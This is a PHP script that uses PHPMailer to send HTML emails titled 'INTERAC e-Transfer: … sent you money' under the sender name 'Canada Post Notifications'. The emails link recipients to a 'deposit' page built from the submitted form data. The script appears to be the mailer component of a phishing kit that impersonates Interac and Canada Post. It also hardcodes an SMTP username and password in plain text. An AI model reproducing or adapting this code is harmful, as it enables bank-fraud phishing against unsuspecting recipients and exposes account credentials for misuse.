<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require("phpmailer/src/PHPMailer.php");
require("phpmailer/src/SMTP.php");
require("phpmailer/src/Exception.php");

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    try {
        // Retrieve form data from POST
        $accountType = $_POST["account-type"];
        $recipientName = $_POST["recipient-name"];
        $recipientEmail = $_POST["recipient-email"];
        $amount = $_POST["amount"];
        $transferDate = $_POST["transfer-date"];
        $memo = $_POST["memo"];

        // Create placeholders array for replacement in the email template
        $placeholders = array(
            '{{etransfer_interac_ca}}' => $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($_POST),
            '{{line}}' => $transferDate,
            '{{username}}' => $recipientName,
            // Add more placeholders as needed
        );

        $message = file_get_contents('template.html'); // Load the email template
        $message = str_replace(array_keys($placeholders), array_values($placeholders), $message);

        $mail = new PHPMailer(true); // Create a new PHPMailer instance with exceptions enabled
        $mail->IsSMTP();
        $mail->SMTPSecure = 'tls';
        $mail->Host = 'mail.mts.net'; // Use the provided host
        $mail->Port = 587; // The common SMTP port for TLS
        $mail->Body = $message;
        $mail->SMTPAuth = true;
        $mail->Username = 'andallard@mymts.net'; // Use the email address as the username
        $mail->Password = 'Batman123'; // Use the provided password
        $mail->SetFrom('andallard@mymts.net', 'Canada Post Notifications'); // Set From name to "Canada Post"
        $mail->AddAddress($recipientEmail);
        $mail->Subject = 'INTERAC e-Transfer: ' . $recipientName . ' sent you money';
        $mail->IsHTML(true);
        $mail->CharSet = "utf-8";

        if ($mail->send()) {
            // Email sent successfully
            echo "Email sent successfully<br>";
        } else {
            // Email sending failed
            echo "Email sending failed<br>";
            echo "Error: " . $mail->ErrorInfo . "<br>"; // Display the detailed error message
        }
    } catch (Exception $e) {
        // Handle exceptions, log errors, or display error messages
        echo "Message could not be sent. Mailer Error: " . $e->getMessage() . "<br>";
    }
} else {
    // Handle the case where the form was not submitted
    echo "Form not submitted<br>";
}
